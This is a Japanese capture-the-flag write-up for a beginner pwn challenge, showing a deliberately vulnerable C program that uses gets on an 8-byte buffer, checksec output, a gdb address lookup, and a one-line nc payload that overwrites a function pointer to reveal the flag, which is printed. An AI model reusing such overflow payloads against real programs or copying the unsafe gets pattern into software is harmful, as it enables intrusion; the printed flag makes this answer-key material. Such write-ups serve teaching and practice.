# danger of buffer overflow:Pwn:100pts
危険です  

[buffer-overflow.c](buffer-overflow.c)　[buffer-overflow](buffer-overflow)  

`nc 34.170.146.252 24310`  

# Solution
CソースとELFが渡される。  
ソースは以下の通りだった。  
```c
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void print_flag() {
  char flag[256];
  int fd = open("./flag.txt", O_RDONLY);
  if (fd < 0) { puts("./flag.txt not found"); return; }
  write(1, flag, read(fd, flag, sizeof(flag)));
}

void bye() {
  puts("bye!");
}

int main() {
  setbuf(stdout, NULL);

  char buf[8];
  void (*funcptr)() = bye;
  
  printf("address of print_flag func: %p\n", print_flag);
  printf("gets to buf: ");
  gets(buf);
  printf("content of funcptr: %p\n", funcptr);
  funcptr();
  return 0;
}
```
`gets`で自明なBOFがあり、`bye`の呼び出し先を上書きできる。  
```bash
$ checksec --file=./buffer-overflow
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   43 Symbols      N/A     0               0               ./buffer-overflow
```
親切なことにNo PIEで`print_flag`のアドレスまで教えてくれている。  
以下のように行う。  
```bash
$ gdb ./buffer-overflow
~~~
pwndbg> p print_flag
$1 = {<text variable, no debug info>} 0x404126 <print_flag>
~~~
$ echo -e 'AAAAAAAA\x26\x41\x40' | nc 34.170.146.252 24310
address of print_flag func: 0x404126
gets to buf: content of funcptr: 0x404126
Alpaca{1_r3ally_d0nt_w4nt_t0_us3_g3t5}
```
flagが得られた。  

## Alpaca{1_r3ally_d0nt_w4nt_t0_us3_g3t5}